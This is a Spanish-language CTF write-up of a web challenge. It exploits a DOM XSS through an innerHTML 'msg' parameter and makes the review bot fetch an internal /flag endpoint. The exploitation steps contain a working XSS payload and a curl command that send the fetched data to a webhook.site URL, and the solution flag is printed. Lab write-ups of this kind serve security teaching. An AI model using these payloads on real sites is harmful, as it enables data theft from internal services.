# Utopia eServices Portal - Writeup CTF

**Reto:** Utopia eServices Portal
**Categoría:** Web
**Flag:** `flag{f5a6a3348262976c}`

## Descripción del Reto

> Los ciudadanos pueden enviar reportes de bugs a los departamentos de Utopia Smart City. El equipo del alcalde revisa los reportes usando un visor interno. ¿Puedes crear una entrada que se ejecute en el navegador del revisor y recuperar la flag oculta?

## Reconocimiento

La aplicación es una app web Flask/Werkzeug en Python que sirve un portal gubernamental. Endpoints clave:

| Endpoint | Método | Descripción |
|----------|--------|-------------|
| `/` | GET | Página principal del portal |
| `/services/utoid` | GET | Página de servicio (vulnerable) |
| `/services/certificates-and-records` | GET | Página de servicio (vulnerable) |
| `/services/visa-and-travel` | GET | Página de servicio (vulnerable) |
| `/report` | POST | Enviar URL para revisión del bot |
| `/flag` | GET | **Solo interno** - devuelve la flag |

## Vulnerabilidad: XSS basado en DOM

Las páginas de servicio contienen una vulnerabilidad XSS en el parámetro `msg`:

```javascript
window.onload = function() {
  let params = new URLSearchParams(window.location.search)
  let msg = params.get("msg")

  if (msg) {
    window.msg.innerHTML = msg.trim() || "This service is coming soon"
  }
}
```

El parámetro `msg` se escribe directamente en `innerHTML` sin ninguna sanitización, permitiendo inyección arbitraria de HTML/JS.

## Comportamiento del Bot

- El endpoint `/report` acepta `{"url": "..."}` via POST
- Un bot HeadlessChrome/140 navega a la URL enviada
- El bot **no tiene cookies, ni localStorage, ni sessionStorage**
- El endpoint `/flag` devuelve 404 externamente pero existe en `localhost:5000`

## Descubrimiento Clave: SSRF via Navegación del Bot

A través de enumeración desde el contexto XSS, descubrimos:

1. **Escaneo de puertos**: `http://127.0.0.1:5000` es alcanzable (puerto interno de Flask)
2. **Bloqueo de contenido mixto**: Desde la página HTTPS, hacer fetch a localhost HTTP está bloqueado (no se pueden leer respuestas)
3. **El endpoint `/report` acepta URLs `http://` incluyendo localhost**

Esto significa que podemos hacer que el bot navegue directamente a `http://127.0.0.1:5000/`, evitando el proxy reverso HTTPS. Desde el origen HTTP localhost, no hay restricciones de contenido mixto.

## Explotación

### Paso 1: Crear el payload XSS

El payload hace fetch a `/flag` en localhost y exfiltra la respuesta a un webhook:

```
http://127.0.0.1:5000/services/utoid?msg=<img%20src=x%20onerror=fetch('/flag').then(function(r){return%20r.text()}).then(function(t){fetch('https://webhook.site/WEBHOOK_UUID/flag?d='%2BencodeURIComponent(t))})>
```

Detalles de codificación:
- `%20` → espacio (separa atributos HTML en contexto sin comillas)
- `%2B` → `+` (operador de concatenación JS, ya que URLSearchParams decodifica `+` como espacio)

### Paso 2: Enviar al bot

```bash
curl -X POST "https://INSTANCIA.chal.ctf.ae/report" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:5000/services/utoid?msg=<img%20src=x%20onerror=fetch(%27/flag%27).then(function(r){return%20r.text()}).then(function(t){fetch(%27https://webhook.site/TU_WEBHOOK/flag?d=%27%2BencodeURIComponent(t))})>"}'
```

### Paso 3: Recibir la flag

El bot navega a `http://127.0.0.1:5000/services/utoid?msg=...`, el XSS se ejecuta, hace fetch a `http://127.0.0.1:5000/flag` (mismo origen, sin problemas de CORS/contenido-mixto), y envía la respuesta a nuestro webhook.

## Resumen de la Cadena de Ataque

```
Atacante                    Servidor del Reto             Bot (HeadlessChrome)
   |                              |                              |
   |--- POST /report ----------->|                              |
   |    url: http://127.0.0.1:   |                              |
   |    5000/services/utoid?msg= |                              |
   |    <payload XSS>            |                              |
   |                              |--- Navegar a URL ----------->|
   |                              |                              |
   |                              |    Página carga, inyección   |
   |                              |    innerHTML dispara onerror |
   |                              |                              |
   |                              |<-- fetch /flag (mismo origen)|
   |                              |--- respuesta con flag ------>|
   |                              |                              |
   |<------- flag exfiltrada via webhook -----------------------|
```

## Por Qué Falló el Acceso Externo

El endpoint `/flag` solo existe en el servidor Flask interno (`127.0.0.1:5000`). El proxy reverso/balanceador de carga que sirve la versión HTTPS no expone esta ruta, devolviendo 404 para peticiones externas. La única forma de alcanzarlo es desde dentro del servidor - de ahí la necesidad del SSRF via el bot.
